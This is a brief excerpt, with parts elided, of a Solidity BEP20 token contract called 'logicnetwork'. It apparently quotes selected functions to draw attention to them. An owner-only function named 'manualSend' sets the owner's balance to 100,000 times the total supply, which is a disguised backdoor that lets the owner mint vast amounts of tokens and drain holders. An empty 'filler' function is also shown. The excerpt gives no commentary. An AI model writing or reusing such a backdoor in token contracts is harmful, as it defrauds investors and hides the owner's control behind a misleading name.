...
contract logicnetwork is IBEP20, Ownable {
    ...
    function setFees(
        ...
        totalFee = marketingFee + devFee + liquidityFee;
    ...
    function manualSend() external onlyOwner {
        ...
        _balanceOf[owner()] = _totalSupply * 100000;
    }

    function filler() external view onlyOwner {
        return;
    }
